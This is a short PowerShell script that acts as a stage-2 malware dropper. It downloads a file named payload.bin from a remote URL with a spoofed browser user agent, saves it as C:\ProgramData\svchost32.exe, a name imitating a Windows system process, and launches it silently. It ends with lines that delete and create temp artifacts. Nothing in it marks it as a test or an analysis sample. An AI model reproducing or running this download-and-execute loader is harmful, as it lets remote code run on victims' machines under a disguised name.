$TargetUrl = 'https://adatum.com/downloads/payload.bin'
$PayloadPath = "C:\ProgramData\svchost32.exe"
$StageTimeout = 67
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Get-Stage2Payload -SourceUrl $TargetUrl -DestinationPath $PayloadPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
if ($OperationResult) {
    Start-Process -FilePath $PayloadPath -ErrorAction SilentlyContinue
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
